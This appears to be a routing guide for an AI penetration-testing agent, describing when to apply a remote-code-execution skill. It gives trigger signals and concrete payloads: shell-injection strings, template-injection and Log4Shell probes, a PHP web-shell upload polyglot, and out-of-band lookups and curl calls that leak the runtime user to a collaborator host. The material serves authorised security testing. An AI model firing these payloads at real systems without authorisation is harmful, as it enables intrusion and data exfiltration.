# rce — when to use

## Trigger signals (dispatch this skill the moment you observe…)

- **A parameter value shows up inside a shell/OS interaction.** If a field name or feature implies the server shells out — `host`, `ip`, `cmd`, `ping`, `target`, `domain`, `nslookup`, `traceroute`, `whois`, `interface`, network-diagnostic tools, "test connection", `convert`, `resize`, `format`, `backup`, `archive`, `compress`, `exec`, `run` — treat the underlying sink as a likely command wrapper → this skill applies.
- **Arithmetic reflection that is EVALUATED, not echoed.** If you send `7*7` (or `${7*7}`, `{{7*7}}`, `#{7*7}`, `<%= 7*7 %>`) into a field and the response contains `49` rather than the literal `7*7`, the input reaches a template/expression evaluator → SSTI → RCE candidate. (If it echoes `7*7` verbatim, it is reflection/XSS, not this skill.)
- **A timing differential you can control.** If injecting `;sleep 5`, `` `sleep 5` ``, `|| ping -c 5 127.0.0.1`, `& timeout /t 5` makes the response take ~5s longer, and removing it returns to baseline → blind command injection confirmed.
- **An out-of-band callback fires.** If `$(curl http://OAST)`, `;nslookup x.oast`, or a logged header with `${jndi:ldap://OAST/a}` produces a DNS or HTTP hit on your collaborator → execution/lookup reached → this skill.
- **A serialized blob crosses the wire.** Base64 starting with `rO0` (Java `ObjectInputStream`), `H4sIA` (gzip'd Java), `AAEAAAD/////` (.NET `BinaryFormatter`), PHP `O:8:"stdClass"` / `a:2:{`, Python pickle opcodes, Ruby Marshal `\x04\x08`, or a `__VIEWSTATE` field without MAC → insecure deserialization → this skill.
- **Stack traces or banners that name a code-exec runtime.** `jinja2.exceptions`, `Twig_Error`, `freemarker.core`, `OGNL`, `SpelEvaluationException`, `eval()`/`assert()` in a PHP trace, `child_process` in a Node trace, `pickle`/`yaml.load` in a Python trace → input is touching an evaluator.
- **A version fingerprint of a known-RCE component.** Log4j ≤ 2.14.1, Struts 2 (S2-* OGNL CVEs), Spring Cloud Function (SpEL), Apache/Tomcat with a vulnerable AJP, an old ImageMagick/Ghostscript/ExifTool behind an upload → dispatch and probe the matching vector.
- **A file-upload feature that lets you control extension or content.** If you can upload `.php`/`.jsp`/`.aspx` (or bypass via `.php.jpg`, `.phtml`, `.pHp`, polyglot, `.htaccess`/`web.config`), and the upload lands in a web-served or auto-loaded path → upload-to-RCE.
- **An SSRF you already confirmed that can reach an internal exec service.** If your SSRF can speak `gopher://` to Redis/php-fpm, or hit Jenkins/Jupyter/Spark/cloud-metadata internally → SSRF→RCE chain belongs here.
- **A media/document/report pipeline.** Anything that ingests an uploaded image, PDF, SVG, DOCX, or generates a PDF/report server-side (ImageMagick, Ghostscript, LibreOffice, LaTeX, Pandoc, ffmpeg, wkhtmltopdf) → out-of-process delegate RCE candidate.

## Use-case scenarios

- **Network-diagnostic and admin tooling.** Routers, IoT dashboards, hosting panels, and "devops" admin pages expose ping/traceroute/nslookup/whois/iptables features that pass user input straight into `system()`/`popen()`. These are the classic command-injection surface; treat every such feature as a sink.
- **Server-side templating with user-influenced templates.** CMS theme editors, email/notification template fields, "personalize this message with `{{name}}`" features, error-page customizers, and any place where a user value lands in a Jinja2/Twig/Freemarker/Velocity/Thymeleaf/Handlebars/EJS render context. Especially dangerous when the user controls the *template string* itself, not just the data.
- **Endpoints consuming serialized objects.** Java apps with `ObjectInputStream` over HTTP/JMS/RMI, ASP.NET ViewState or `LosFormatter`/`BinaryFormatter` inputs, PHP `unserialize()` on cookies or PHAR-triggering file operations, Python `pickle`/`yaml.load`, Ruby Marshal. Look in cookies, hidden form fields, cache/queue payloads, and API bodies.
- **File upload + revisit.** When upload validation is weak and you can either name the file with a code extension or smuggle a handler config (`.htaccess`, `web.config`, `.user.ini`), then browse back to the uploaded path to execute.
- **Expression-language injection in frameworks.** Struts (OGNL), Spring (SpEL), anything with EL in error/search/sort parameters. A bare arithmetic eval here is a direct path to `Runtime.exec`.
- **Logged-header injection (Log4Shell family).** Any app that logs `User-Agent`, `Referer`, `X-Forwarded-For`, or custom headers through a vulnerable Log4j/JNDI-capable logger.
- **Second-order / SQLi-to-RCE and SSRF-to-RCE.** When a confirmed SQLi has `INTO OUTFILE`/`COPY ... TO PROGRAM`/`xp_cmdshell` reachable, or a confirmed SSRF reaches Redis/FPM/metadata, the escalation to code execution lives in this skill.

## Concrete tells (request → response examples)

- **Command injection (blind, timing):**
  `GET /ping?host=127.0.0.1%3Bsleep%205` → response latency jumps from ~50ms to ~5050ms; `host=127.0.0.1` alone returns instantly. Confirms shell metacharacter is honored.
- **Command injection (output):**
  `host=127.0.0.1;id` → response body contains `uid=0(root) gid=0(root)` or `www-data`. Direct execution.
- **SSTI fingerprint then confirm:**
  Send `{{7*'7'}}` → Jinja2 returns `7777777` (Python string-multiply), Twig returns `49`. The *kind* of wrong answer fingerprints the engine. `${7*7}` → `49` suggests Freemarker/Velocity/SpEL.
- **Freemarker:** `${product.getClass()}` or `${"freemarker.template.utility.Execute"?new()("id")}` returns `uid=...`.
- **Deserialization tell:** request body or cookie is base64 that decodes to bytes starting `\xac\xed\x00\x05` (Java) → the endpoint deserializes untrusted input.
- **Log4Shell:** set `User-Agent: ${jndi:ldap://abc.oast.site/a}` → your OAST server logs an LDAP/DNS lookup from the target's egress IP within seconds.
- **OAST DNS exfil of output:** `host=x;nslookup \`whoami\`.oast.site` → your collaborator receives `www-data.oast.site` — confirms execution *and* leaks the runtime user in one shot.
- **Upload-to-RCE:** POST a `GIF89a;<?php system($_GET['c']);?>` polyglot named `avatar.php.jpg`; then `GET /uploads/avatar.php.jpg?c=id` returns `uid=...` if the path executes PHP.
- **PostgreSQL SQLi→RCE:** `COPY (SELECT '') TO PROGRAM 'curl http://oast/$(id|tr " " .)'` → OAST hit carrying the uid.

## When NOT to use it / easily-confused-with

- **Reflected/stored value that is rendered but NOT evaluated → XSS, not this skill.** If `7*7` comes back as the literal string `7*7` (or `<b>` is rendered as markup), the value reaches the HTML/JS context, not a server-side evaluator. SSTI requires the math/expression to be *computed* server-side.
- **Input that reaches a SQL query but no exec primitive → SQLi skill.** A boolean/UNION/error-based SQLi is its own class. Only route here once you have a *confirmed* SQLi AND a reachable `INTO OUTFILE` / `TO PROGRAM` / `xp_cmdshell` / UDF path.
- **A URL/host parameter that fetches a resource but does not shell out → SSRF, not RCE.** If the server makes an outbound request on your behalf but you cannot reach an exec sink (FPM/Redis/metadata-to-creds), it stays SSRF. Only the SSRF→exec chain is in scope here.
- **Path traversal / arbitrary file read with no write or execution → LFI/traversal skill.** Reading `/etc/passwd` is disclosure. It becomes RCE only when you can *write* to an auto-loaded/executable location (cron, `.ssh`, webroot, `.user.ini`, log-poisoning into an included file).
- **Open redirect, header injection, CRLF → their own classes** unless the injected content lands in a code-execution sink (e.g. CRLF into a logged JNDI header).
- **A crash, 500, or timeout with no controlled behavior is not proof.** A field that errors on a quote is a *hint*, not a confirmed sink; do not declare RCE until a quiet oracle (timing/OAST/deterministic diff) proves code actually ran.
- **Sandboxed/restricted interpreters** (e.g. a math-only expression evaluator, a CSP-locked JS VM with no `require`/`process`) — note the limitation; do not over-claim host compromise from inside a sealed sandbox or container without proving boundary crossing.

B:rce done

